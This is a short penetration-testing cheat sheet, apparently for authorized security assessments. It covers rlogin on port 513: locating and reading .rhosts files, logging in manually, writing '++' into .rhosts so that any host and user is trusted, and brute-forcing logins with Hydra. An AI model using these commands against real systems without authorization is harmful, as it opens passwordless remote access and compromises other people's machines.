<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
rlogin (Port 513)

Rlogin Enumeration
    Find the files
        find / -name .rhosts
        locate .rhosts
    Examine Files
        cat .rhosts
    Manual Login
        rlogin hostname -l username
        rlogin <IP>
    Subvert the files
        echo ++ > .rhosts
Rlogin Brute force
    Hydra